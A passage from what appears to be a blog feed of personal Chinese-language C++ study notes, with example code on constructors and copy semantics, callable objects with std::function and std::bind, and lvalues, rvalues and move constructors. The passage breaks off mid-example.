</code>后面创建了一个<code>zjy（匿名对象）</code>，相当于在函数外边创建了一个对象，这里不会采用拷贝构造，所以时无参构造</li><li>析构函数：因为没有接收对象，所以在49行的时候析构掉了</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">zjy <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">zjy</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//func();</span><br>    zjy chg=<span class="hljs-built_in">func</span>();<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221201155016536.png" alt="image-20221201155016536"></p><ul><li>无参构造：因为调用<code>test_func_2()</code>，创建了一个匿名对象，采用无参构造（和上面的无参构造一样）</li><li>析构：因为main函数结束，调用析构函数</li></ul></li></ul></li><li><p>对于指针的构造：不能直接将指针指向那个地址，而是，创建一个新的内存用于存放原有的数据</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> *p=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">5</span>];<br>    <span class="hljs-type">int</span> *q=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">5</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        p[i]=i;<span class="hljs-comment">//可以相当于创建了一个数组，对于数组的存储可以用arr[i]=int类型</span><br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        q[i]=p[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        cout&lt;&lt;q[i]&lt;&lt;<span class="hljs-string">&quot;\t&quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>浅拷贝和深拷贝</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221202094645975.png" alt="image-20221202094645975"></p></li><li><p>如何防止默认拷贝的发生（浅拷贝）？</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221202095003679.png" alt="image-20221202095003679"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可调用对象包装器</title>
    <link href="/2023/03/26/c++/%E5%8F%AF%E8%B0%83%E7%94%A8%E5%AF%B9%E8%B1%A1%E5%8C%85%E8%A3%85%E5%99%A8/"/>
    <url>/2023/03/26/c++/%E5%8F%AF%E8%B0%83%E7%94%A8%E5%AF%B9%E8%B1%A1%E5%8C%85%E8%A3%85%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="可调用对象包装器"><a href="#可调用对象包装器" class="headerlink" title="可调用对象包装器"></a>可调用对象包装器</h1><h2 id="可调用对象"><a href="#可调用对象" class="headerlink" title="可调用对象"></a>可调用对象</h2><p>可以按照函数的方法进行调用</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li><p>函数指针</p><blockquote><p>使用<code>using</code>进行定义函数指针</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> callBack = <span class="hljs-built_in">void</span>(*)(<span class="hljs-type">int</span>, <span class="hljs-type">double</span>);<br></code></pre></td></tr></table></figure></li><li><p>仿函数</p></li><li><p>可以转换为函数的类对象</p></li><li><p>类成员的函数指针</p></li><li><p>实例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*这段代码定义了一个名为name1的类，其中包含两个函数testFunc和testFunc2。testFunc是静态函数，可以通过指针调用，而testFunc2是实例方法，只能通过对象调用。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">此外，代码还定义了一个名为callBack的函数指针类型，它接受一个int类型和一个double类型的参数，并且没有返回值。在类定义中，将operator callBack()定义为转换运算符，它返回testFunc的指针，使得对象也可以像函数一样被调用。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">在main函数中，首先使用obj.operator callBack()将obj对象转换为callBack类型的函数指针，并将其赋值给func。然后，使用&amp;name1::testFunc将testFunc的地址赋值给func2，使用&amp;name1::testFunc2将testFunc2的地址赋值给func3。最后，使用func(1,2)调用testFunc函数。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">整体来说，此代码演示了如何定义和使用函数指针以及转换运算符的概念。*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span>  std;<br><span class="hljs-keyword">using</span> callBack=<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">int</span> ,<span class="hljs-type">double</span>);<br> <span class="hljs-keyword">class</span> <span class="hljs-title class_">name1</span> &#123;<br><span class="hljs-keyword">public</span>:<br>     <span class="hljs-comment">//callBack是定义的函数指针变量名,这一步是想将类名当作函数使用</span><br>     <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">callBack</span> <span class="hljs-params">()</span></span>&#123;<br>         <span class="hljs-keyword">return</span> testFunc;<br>     &#125;<br>     <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">testFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">double</span> b)</span></span>&#123;<br>         cout&lt;&lt;a+b&lt;&lt;endl;<br>     &#125;<br>     <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">testFunc2</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">double</span> b)</span></span>&#123;<br>         cout&lt;&lt;a+b&lt;&lt;endl;<br>     &#125;<br>&#125;;<br><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">using</span> callBack2=<span class="hljs-built_in">void</span>(name1::*)(<span class="hljs-type">int</span> ,<span class="hljs-type">double</span>);<br>    name1 obj;<br>    <span class="hljs-comment">//通过转换运算符</span><br>    callBack func=obj.<span class="hljs-keyword">operator</span> <span class="hljs-built_in">callBack</span>();<br>    <span class="hljs-comment">//通过函数指针</span><br>    callBack func2=&amp;name1::testFunc;<br>    <span class="hljs-comment">//callBack2是限定了作用域的函数指针，注意此处必须要有&amp;</span><br>    callBack2 func3=&amp;name1::testFunc2;<br><br>    <span class="hljs-built_in">func</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="function的使用"><a href="#function的使用" class="headerlink" title="function的使用"></a><code>function</code>的使用</h2><ul><li><p>作用：说是可调用对象当作函数使用</p></li><li><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;functional&quot;</span></span><br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;string&quot;</span></span><br>  <span class="hljs-keyword">using</span> callBack = <span class="hljs-built_in">void</span>(*)(<span class="hljs-type">int</span> a,std::string s);<br>  <br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>      std::cout&lt;&lt;<span class="hljs-string">&quot;this is func&quot;</span>&lt;&lt;std::endl;<br>      std::cout&lt;&lt;<span class="hljs-string">&quot;a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; string: &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>  &#125;<br>  <br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">testStruct</span>&#123;<br>      <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;this is testStruct&quot;</span>&lt;&lt;std::endl;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; string: &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>      &#125;<br>  &#125;;<br>  <br>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">name1</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>      <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">classFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;this is classFunc&quot;</span>&lt;&lt;std::endl;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; string: &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>      &#125;<br>      <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">callBack</span> <span class="hljs-params">()</span></span>&#123;<br>          <span class="hljs-keyword">return</span> classFunc;<br>      &#125;<br>  <br>      <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;this is classOperator()&quot;</span>&lt;&lt;std::endl;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; string: &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>      &#125;<br>  &#125;;<br>  <br>  <span class="hljs-keyword">class</span>  <span class="hljs-title class_">print</span>&#123;<br>  <span class="hljs-keyword">public</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-type">const</span> std::function&lt;<span class="hljs-built_in">void</span>(<span class="hljs-type">int</span>,std::string)&gt;&amp; function1):<span class="hljs-built_in">tem</span>(function1)&#123;&#125;;<br>      <span class="hljs-comment">//调用function</span><br>       <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Printf</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>          <span class="hljs-built_in">tem</span>(a,s);<br>      &#125;<br>  <span class="hljs-keyword">private</span>:<br>      std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>,std::string)&gt; tem;<br>  &#125;;<br>  <br>  <br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-comment">//通过函数包装器调用普通函数</span><br>      std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>,std::string)&gt; f1=func;<br>      <span class="hljs-built_in">func</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;chg&quot;</span>);<br>      <span class="hljs-comment">//伪函数</span><br>      std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>,std::string)&gt; f2=<span class="hljs-built_in">testStruct</span>();<br>      <span class="hljs-built_in">f2</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;zjy&quot;</span>);<br>      <span class="hljs-comment">//类里面的静态函数</span><br>      f2=name1::classFunc;<br>      <span class="hljs-built_in">f2</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;tsy&quot;</span>);<br>      <span class="hljs-comment">//通过转换运算符，将类变成了可调用对象</span><br>      name1 name;<br>      f2=name;<br>      <span class="hljs-built_in">f2</span>(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;xxp&quot;</span>);<br>  <br>      <span class="hljs-comment">//尝试将function当成参数，调用</span><br>      <span class="hljs-function">print <span class="hljs-title">objPrint</span><span class="hljs-params">(f1)</span></span>;<br>      objPrint.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;jc&quot;</span>);<br>      <span class="hljs-comment">//因为我们的类是可调用的对象所以可以当作function</span><br>      <span class="hljs-function">print <span class="hljs-title">objPrint2</span><span class="hljs-params">(name)</span></span>;<br>      objPrint2.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;wr&quot;</span>);<br>      <span class="hljs-comment">//调用类的静态</span><br>      <span class="hljs-function">print <span class="hljs-title">objPrint3</span><span class="hljs-params">(name.classFunc)</span></span>;<br>      objPrint3.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">7</span>,<span class="hljs-string">&quot;01&quot;</span>);<br>      <span class="hljs-comment">//普通函数调用</span><br>      <span class="hljs-function">print <span class="hljs-title">objPrint4</span><span class="hljs-params">(func)</span></span>;<br>      objPrint4.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;gzx&quot;</span>);<br>      <span class="hljs-comment">//使用伪函数时需要创建对象</span><br>      testStruct testStruct;<br>      <span class="hljs-function">print <span class="hljs-title">objPrint5</span><span class="hljs-params">(testStruct)</span></span>;<br>      objPrint5.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">9</span>,<span class="hljs-string">&quot;tcx&quot;</span>);<br>      <br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>## 可调用对象绑定器<br><br>- 作用：<br>  - 将可调用对象绑定成仿函数<br>  - 将多元参数函数绑定成参数为<span class="hljs-number">1</span>，或者（n<span class="hljs-number">-1</span>）的可调用对象<br><br>- 绑定非类的实例：<br><br>  ```c++<br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;functional&quot;</span></span><br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;string&quot;</span></span><br>  <br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>      std::cout&lt;&lt;<span class="hljs-string">&quot; a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; s = &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>      <span class="hljs-keyword">auto</span> f1 = std::<span class="hljs-built_in">bind</span>(print,std::placeholders::_1,std::placeholders::_2);<br>      <span class="hljs-built_in">f1</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;chg&quot;</span>);<br>      <span class="hljs-comment">//注意如果在bind的时候初始化了a和s则在f2(),的括号中添加的参数，没有效果</span><br>      <span class="hljs-keyword">auto</span> f2= std::<span class="hljs-built_in">bind</span>(print,<span class="hljs-number">2</span>,<span class="hljs-string">&quot;zjy&quot;</span>);<br>      <span class="hljs-built_in">f2</span>();<br>      <span class="hljs-built_in">f2</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;xxp&quot;</span>);<span class="hljs-comment">//无效果</span><br>      <span class="hljs-keyword">auto</span> f3= std::<span class="hljs-built_in">bind</span>(print,std::placeholders::_1,<span class="hljs-string">&quot;xxp&quot;</span>);<br>      <span class="hljs-built_in">f3</span>(<span class="hljs-number">3</span>);<br>      <br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br></code></pre></td></tr></table></figure></li><li><p>绑定类里的成员函数和成员变量的实例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;functional&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;string&quot;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">myClass</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;this is classFunc&quot;</span>&lt;&lt;std::endl;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; string: &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>    &#125;<br>    std::string s;<br>&#125;;<br><br><span class="hljs-keyword">class</span>  <span class="hljs-title class_">print</span>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-type">const</span> std::function&lt;<span class="hljs-built_in">void</span>(<span class="hljs-type">int</span>,std::string)&gt;&amp; function1):<span class="hljs-built_in">tem</span>(function1)&#123;&#125;;<br>    <span class="hljs-comment">//调用function</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Printf</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>        <span class="hljs-built_in">tem</span>(a,s);<br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>,std::string)&gt; tem;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//类的成员函数的绑定</span><br>    myClass myclassObj1;<br>    <span class="hljs-keyword">auto</span> f1= std::<span class="hljs-built_in">bind</span>(&amp;myClass::test,&amp;myclassObj1,std::placeholders::_1,std::placeholders::_2);<br>    <span class="hljs-function">print <span class="hljs-title">frintObj1</span><span class="hljs-params">(f1)</span></span>;<br>    frintObj1.<span class="hljs-built_in">Printf</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;chg&quot;</span>);<br>    <span class="hljs-comment">//绑定类的成员变量</span><br>    <span class="hljs-keyword">auto</span> f2= std::<span class="hljs-built_in">bind</span>(&amp;myClass::s,&amp;myclassObj1);<br>    <span class="hljs-built_in">f2</span>()=<span class="hljs-string">&quot;chg&quot;</span>;<span class="hljs-comment">//对类成员赋值</span><br>    std::cout&lt;&lt;<span class="hljs-built_in">f2</span>()&lt;&lt;std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>右值和左值</title>
    <link href="/2023/03/26/c++/%E5%8F%B3%E5%80%BC%E5%92%8C%E5%B7%A6%E5%80%BC/"/>
    <url>/2023/03/26/c++/%E5%8F%B3%E5%80%BC%E5%92%8C%E5%B7%A6%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="右值和左值"><a href="#右值和左值" class="headerlink" title="右值和左值"></a>右值和左值</h1><h2 id="右值左值的区分"><a href="#右值左值的区分" class="headerlink" title="右值左值的区分"></a>右值左值的区分</h2><ol><li><p>能取地址的是左值，不能取地址的是右值</p></li><li><p>实例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//左值</span><br>    <span class="hljs-type">int</span> lvalue=<span class="hljs-number">244</span>;<br>    <span class="hljs-comment">//左值引用</span><br>    <span class="hljs-type">int</span> &amp;lvalueCite=lvalue;<br>    <span class="hljs-comment">//右值</span><br>    <span class="hljs-comment">//右值引用</span><br>    <span class="hljs-type">int</span> &amp;&amp;rvalueCite=<span class="hljs-number">6</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用右值引用延长生命周期</p></li></ol><h2 id="移动构造函数"><a href="#移动构造函数" class="headerlink" title="移动构造函数"></a>移动构造函数</h2><ol><li><p>作用： 复用其他对象的资源（堆内存）</p></li><li><p>实现浅拷贝 </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">name1</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//无参构造</span><br>    <span class="hljs-built_in">name1</span>()&#123;<br>        mPtr=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>;<br>    &#125;<br>    <span class="hljs-comment">//拷贝构造</span><br>    <span class="hljs-built_in">name1</span>(<span class="hljs-type">const</span> name1 &amp;tem)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;mPtr=tem.mPtr;<br>    &#125;<br>    <span class="hljs-comment">//移动构造</span><br>    <span class="hljs-built_in">name1</span>(name1&amp;&amp; tem):<span class="hljs-built_in">mPtr</span>(tem.mPtr)<br>    &#123;<br>        tem.mPtr=<span class="hljs-literal">nullptr</span>;<br><br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> * mPtr;<br>&#125;;<br><br><span class="hljs-function">name1 <span class="hljs-title">getObj</span><span class="hljs-params">()</span></span>&#123;<br>    name1 name11;<br>    *name11.mPtr=<span class="hljs-number">2</span>;<br>    std::cout&lt;&lt;name11.mPtr&lt;&lt;std::endl;<br>    <span class="hljs-keyword">return</span> name11;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//要求右侧是个临时对象，才会调用移动拷贝构造函数</span><br>    <span class="hljs-comment">//如果没有移动拷贝构造函数，就会调用拷贝构造函数</span><br>    name1 obj=<span class="hljs-built_in">getObj</span>();<br>    std::cout&lt;&lt;obj.mPtr&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;*obj.mPtr&lt;&lt;std::endl;<br>    name1&amp;&amp; 